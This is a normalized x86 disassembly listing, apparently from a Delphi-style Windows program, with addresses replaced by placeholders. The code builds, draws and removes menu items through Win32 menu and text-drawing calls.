mov edx [ rw-data ]
call sub_44da00
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44db3e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44d7fc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407edc
test eax eax
jne r-xdata
sub_44db74
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_450114
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_450124
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_44dbd4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_450114
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_450114
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_450124
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_450124
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_44db74
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_44db74
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_450124
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_450124
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_44dd20
push ebx
mov ebx eax
mov eax ebx
call sub_44a410
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_452c30
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44dd58
push ebx
mov ebx eax
mov eax ebx
call sub_44a424
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44dd88
push ebx
mov ebx eax
mov eax ebx
call sub_44a438
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44ddb8
push ebx
mov ebx eax
mov eax ebx
call sub_44a460
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44dde8
push ebx
mov ebx eax
mov eax ebx
call sub_44a488
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_404480
je r-xdata
mov al 0x1
pop ebx
retn
sub_44de1c
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44a44c
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_44de58
push ebx
mov ebx eax
mov eax ebx
call sub_44a49c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44de8c
push ebx
mov ebx eax
mov eax ebx
call sub_44a4b0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44dec0
push ebx
mov ebx eax
mov eax ebx
call sub_44a4c4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44def4
push ebx
mov ebx eax
mov eax ebx
call sub_41a9d4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44df1c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_44df3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44ff7c
sub_44df5c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44ffec
sub_44df7c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_450040
sub_44df9c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_44dfb8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_4040c8
sub_44dfdc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45016c
sub_44dffc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_450148
sub_44e01c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45015c
sub_44e03c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_44e068
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41a0e4
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_44db54
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_450a78
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_44e0e4
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_452a14
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_450114
test eax eax
jg r-xdata
mov edx esi
call sub_4504ac
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_450124
call sub_4032a0
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_4032a0
lea eax [ esi + 0x44 ]
call sub_40d01c
lea eax [ esi + 0x78 ]
call sub_40d01c
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_44e500
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_41434c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a130
test bl bl
jle r-xdata
call sub_4032a0
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_44e198
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44e3f3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e3fa
lea eax [ ebp - 0x40 ]
call sub_404074
lea eax [ ebp - 0x8 ]
call sub_404074
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_40410c
mov eax ebx
call sub_450114
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_44e6a8
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404480
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_450114
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_4506d0
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_44d7fc
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4043f4
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404534
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_404534
push eax
mov eax ebx
call sub_44e6a8
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_44fcec
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404480
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_404534
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_450114
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_44e6a8
mov [ ebp - 0x25 ] eax
sub_44e413
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_44e198
xor eax eax
pop ebp
retn
sub_44e438
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_451d0c
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_450cd4
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4511d0
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_44dbd4
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_44e4a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44e4f2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_418d0c
mov eax [ ebp - 0x4 ]
call sub_44da5c
mov edx eax
mov eax ebx
call sub_450148
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e4f9
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_44e500
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_44e578
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_41a1b4
sub_44e53c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41a534
mov eax ebx
call sub_4500fc
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_4500fc
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_40349c
pop esi
pop ebx
retn
mov eax ebx
call sub_44e578
sub_44e578
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_44e6a8
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_44e578
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_44e6a8
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_44e6a8
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_44e438
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax ebp
call sub_44e6a8
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44e648
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_450114
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_450124
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_450124
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_450124
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_44d750
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_44e6a8
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_44e438
mov eax [ rw-data ]
call sub_44d750
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_44e6f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a45c
push ebx
push sub_44e4a8
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_44e738
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_44e91c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4506d0
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_40410c
test bh 0x4
je r-xdata
mov eax edi
call sub_451d0c
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404480
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41dd08
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40433c
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_41d6c0
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_41d6cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e923
lea eax [ ebp - 0xc ]
call sub_404074
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41e4e4
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404334
push eax
mov eax [ ebp - 0xc ]
call sub_404534
push eax
mov eax [ ebp - 0x4 ]
call sub_41e4e4
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41d400
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404334
push eax
mov eax [ ebp - 0xc ]
call sub_404534
push eax
mov eax [ ebp - 0x4 ]
call sub_41e4e4
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41d400
mov eax 0xff00000d
call sub_41cf40
mov esi eax
mov eax 0xff000010
call sub_41cf40
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41d400
jmp r-xdata
sub_44e988
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_44f270
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dfc4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41dbec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41d400
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404480
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41dbec
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dfc4
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44b524
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
